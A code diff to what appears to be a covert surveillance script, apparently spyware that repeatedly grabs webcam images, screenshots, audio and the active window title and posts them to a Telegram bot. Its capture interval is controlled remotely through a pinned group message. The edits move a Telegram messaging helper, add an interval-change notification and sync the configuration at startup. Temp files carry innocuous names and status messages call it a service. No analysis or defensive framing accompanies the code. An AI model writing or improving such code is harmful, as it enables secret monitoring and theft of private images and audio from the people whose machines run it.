@@ -42,6 +42,16 @@ def get_active_window():
             return "Error retrieving window"
     return "Non-Windows Environment"
 
+def send_text_message(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": text}
+    if TOPIC_GENERAL and str(TOPIC_GENERAL) != "1":
+        payload["message_thread_id"] = TOPIC_GENERAL
+    try:
+        requests.post(url, data=payload)
+    except Exception:
+        pass
+
 def update_remote_config():
     """Checks the PINNED message in the group to get the broadcasted interval."""
     global INTERVAL
@@ -57,19 +67,9 @@ def update_remote_config():
             if nums:
                 new_val = int(nums[0])
                 if 10 <= new_val <= 3600 and new_val != INTERVAL:
+                    old_val = INTERVAL
                     INTERVAL = new_val
-                    # Optional: Notify that this specific machine updated
-                    # (Disabled by default to avoid spam from many machines)
-    except Exception:
-        pass
-
-def send_text_message(text):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {"chat_id": CHAT_ID, "text": text}
-    if TOPIC_GENERAL and str(TOPIC_GENERAL) != "1":
-        payload["message_thread_id"] = TOPIC_GENERAL
-    try:
-        requests.post(url, data=payload)
+                    send_text_message(f"🔄 Sync: Interval changed from {old_val}s to {INTERVAL}s via Pinned Message.")
     except Exception:
         pass
 
@@ -120,7 +120,9 @@ def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
 def main():
     if not TOKEN or not CHAT_ID: return
 
-    send_text_message(f"🚀 SVC ONLINE. Broadcast listener active.")
+    # Initial check to sync with current pin before starting loop
+    update_remote_config()
+    send_text_message(f"🚀 SVC ONLINE. Mode: Broadcast Sync. Current Interval: {INTERVAL}s")
 
     w_f = get_temp_path("idx_01.tmp")
     s_f = get_temp_path("idx_02.tmp")
@@ -128,9 +130,6 @@ def main():
 
     try:
         while True:
-            # Sync with the Pinned Message configuration
-            update_remote_config()
-
             ctx = get_active_window()
             capture_webcam(w_f)
             capture_screenshot(s_f)
@@ -142,11 +141,11 @@ def main():
                     try: os.remove(f)
                     except: pass
 
-            # Wait for next cycle, checking for pin updates occasionally
+            # Wait and check for pin updates
             wait_start = time.time()
             while time.time() - wait_start < INTERVAL:
                 update_remote_config()
-                time.sleep(10) # Check pinned message every 10s
+                time.sleep(10)
             
     except KeyboardInterrupt:
         pass
